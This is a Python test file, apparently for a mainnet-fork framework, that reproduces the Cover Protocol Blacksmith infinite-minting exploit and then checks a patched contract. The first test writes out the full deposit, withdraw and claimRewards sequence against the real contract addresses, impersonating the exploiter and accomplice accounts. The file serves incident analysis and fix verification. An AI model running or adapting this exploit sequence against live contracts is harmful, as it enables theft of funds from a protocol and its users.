def test_exploit(chain, interface, accounts):
    exploiter = accounts.at("0x00007569643bc1709561ec2e86f385df3759e5dd", force=True)
    accomplice = accounts.at("0xdf1aefb979d180b4d67cca9abb4c5108c89dc8a4", force=True)
    bs = interface.Blacksmith("0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5", owner=exploiter)
    bpt = interface.ERC20("0x59686E01Aa841f622a43688153062C2f24F8fDed")
    cover = interface.Cover("0x5d8d9f5b96f4438195be9b99eee6118ed4304286")

    amount = bpt.balanceOf(exploiter)
    drain = bs.miners(bpt, accomplice).dict()["amount"]

    bs.deposit(bpt, amount)
    bs.withdraw(bpt, amount - 1)
    bs.withdraw(bpt, drain, {"from": accomplice})
    chain.sleep(100)
    bs.deposit(bpt, amount - 1)
    bs.claimRewards(bpt)

    print(cover.balanceOf(exploiter).to("ether"))
    assert cover.balanceOf(exploiter) > "1000 ether"


def test_exploit_fix(chain, interface, accounts, Blacksmith):
    bs = interface.Blacksmith("0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5")
    cover = interface.Cover("0x5d8d9f5b96f4438195be9b99eee6118ed4304286")
    bpt = interface.ERC20("0x59686E01Aa841f622a43688153062C2f24F8fDed")

    # assume control of the governance
    governance = accounts.at(bs.governance(), force=True)
    accounts[0].transfer(governance, "10 ether")

    # deploy fixed Blacksimth, transfer minting rights and prepare the pool
    fixedBs = governance.deploy(Blacksmith, cover, governance, bs.treasury())
    bs.transferMintingRights(fixedBs, {"from": governance})
    fixedBs.addPool(bpt, 102, {"from": governance})

    bs = fixedBs

    exploiter = accounts.at("0x00007569643bc1709561ec2e86f385df3759e5dd", force=True)
    accomplice = accounts.at("0xdf1aefb979d180b4d67cca9abb4c5108c89dc8a4", force=True)

    amount = bpt.balanceOf(exploiter)
    drain = bs.miners(bpt, accomplice).dict()["amount"]

    # re-approve BPT on the new blacksmith
    bpt.approve(bs, 2 ** 256 - 1, {"from": exploiter})
    bs.deposit(bpt, amount, {"from": exploiter})
    bs.withdraw(bpt, amount - 1, {"from": exploiter})
    chain.sleep(100)
    bs.deposit(bpt, amount -1, {"from": exploiter})
    bs.claimRewards(bpt, {"from": exploiter})

    print(cover.balanceOf(exploiter).to("ether"))
    assert cover.balanceOf(exploiter) < "1 ether"
